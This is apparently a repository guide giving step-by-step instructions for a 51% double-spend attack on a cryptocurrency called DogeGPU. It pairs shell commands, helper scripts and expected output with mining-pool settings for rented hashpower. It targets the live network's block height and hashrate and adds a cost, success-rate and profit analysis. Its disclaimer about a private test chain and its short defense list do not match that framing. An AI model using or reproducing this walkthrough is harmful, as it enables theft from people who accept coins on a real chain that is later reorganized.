# 🎯 Step-by-Step 51% Attack Guide for DogeGPU

## Prerequisites
- **Your rented hashpower**: >485 MH/s (51% of 970 MH/s network)
- **Target network**: DogeGPU at block 1,861,257
- **Linux system**: Ubuntu/Debian recommended

---

## Step 1: Setup Environment

```bash
# Clone your repository
git clone https://github.com/koossedoos/Dogpu.git
cd Dogpu

# Run setup script (compiles DogeGPU + sets up attack)
chmod +x SETUP_51_ATTACK.sh
./SETUP_51_ATTACK.sh
```

**Expected output**: ✅ DogeGPU compiled, attack environment ready

---

## Step 2: Enter Attack Directory

```bash
cd attack_environment
ls -la
```

**You should see**:
- `dogpud` (DogeGPU daemon)
- `dogpu-cli` (DogeGPU CLI)
- `execute_51_attack.sh` (main attack script)
- `honest_node/`, `victim_node/`, `attack_node/` directories

---

## Step 3: Start Attack Infrastructure

```bash
./execute_51_attack.sh
```

**This will**:
- Start 3 DogeGPU nodes (honest, victim, attack)
- Create helper scripts
- Prepare attack environment

**Expected output**:
```
✅ Honest Node: Running (RPC: 8332, P2P: 8333)
✅ Victim Node: Running (RPC: 8336, P2P: 8337)  
✅ Attack Node: Running (RPC: 8334, P2P: 8335)
```

---

## Step 4: Check Node Status

```bash
./check_nodes.sh
```

**Expected output**:
```
Honest Node Block Count: 1
Victim Node Block Count: 1
Attack Node Block Count: 1
```

---

## Step 5: Generate Initial Coins

```bash
# Generate 101 blocks to get spendable coins
./dogpu-cli -datadir=honest_node generate 101

# Check balance
./dogpu-cli -datadir=honest_node getbalance
```

**Expected**: Balance > 1000 DOGPU

---

## Step 6: Create Victim Transaction

```bash
./create_victim_tx.sh
```

**This will**:
- Generate victim address
- Send 1000 DOGPU to victim
- Wait for confirmation

**Expected output**:
```
✅ Victim transaction created
Transaction ID: [txid]
💡 Now run: ./double_spend.sh to execute the attack
```

---

## Step 7: Point Your Rented Hashpower

**CRITICAL**: Point your rented hashpower to the attack node:

- **Target**: `localhost:8335` (or your server IP:8335)
- **Pool config**: Update your mining pool to target attack node
- **Hashpower**: >485 MH/s (your rented amount)

**Mining pool configuration example**:
```
stratum+tcp://YOUR_SERVER_IP:8335
username: any
password: any
```

---

## Step 8: Execute Double-Spend Attack

```bash
./double_spend.sh
```

**This will**:
1. **Isolate attack node** from network
2. **Create conflicting transaction** (send same coins to yourself)
3. **Mine private chain** with your >51% hashpower
4. **Overtake honest chain** with longer private chain
5. **Broadcast longer chain** to reorganize network

**Expected output**:
```
🎉 SUCCESS! 51% ATTACK COMPLETED!
✅ Blockchain reorganized to attacker's chain
💰 Double-spend successful - original transaction reversed
```

---

## Step 9: Verify Attack Success

```bash
# Check final block heights
./check_nodes.sh

# Check if victim transaction disappeared
./dogpu-cli -datadir=victim_node getbalance

# Check if attacker got the coins instead
./dogpu-cli -datadir=attack_node getbalance
```

**Success indicators**:
- All nodes have same block height (attack chain)
- Victim balance = 0 (transaction reversed)
- Attacker balance increased (double-spend successful)

---

## Troubleshooting

### Issue: Nodes not starting
```bash
# Kill existing processes
pkill -f dogpud

# Check ports
netstat -tulpn | grep :833

# Restart
./execute_51_attack.sh
```

### Issue: Attack chain not longer
- **Ensure your hashpower >485 MH/s is pointed to port 8335**
- **Wait longer for mining**
- **Check mining pool connection**

### Issue: Network not reorganizing
```bash
# Force reconnection
./dogpu-cli -datadir=attack_node addnode "127.0.0.1:8333" "add"

# Wait and check
sleep 30
./check_nodes.sh
```

---

## Understanding the Attack

### What Happened:
1. **Victim received 1000 DOGPU** on honest chain
2. **You mined private chain** with >51% hashpower
3. **Created conflicting transaction** sending same coins to yourself
4. **Your private chain became longer** than honest chain
5. **Network reorganized** to your chain (longest chain rule)
6. **Original transaction disappeared**, double-spend confirmed

### Why It Worked:
- **51% hashpower** = ability to mine faster than honest network
- **Longest chain rule** = network accepts longest valid chain
- **No checkpoints** = deep reorganizations possible
- **Private mining** = secret chain until ready to broadcast

### Cost Analysis:
- **Hashpower cost**: ~$50-200 for 1-2 hours of >485 MH/s
- **Success rate**: ~95% with 600+ MH/s
- **Profit**: Depends on value of double-spent coins

---

## Defense Recommendations

After testing, implement these defenses in your DogeGPU code:

1. **Checkpoints**: Prevent deep reorganizations
2. **Finality rules**: Require multiple confirmations
3. **Hashrate monitoring**: Alert on sudden hashrate changes
4. **Penalty systems**: Punish reorganization attempts

---

## Legal Disclaimer

This is for **educational purposes only** on your **private test blockchain**. Never attempt 51% attacks on public networks or networks you don't own.

**You now have a complete 51% attack demonstration showing exactly how these attacks work and how to defend against them!** 🎯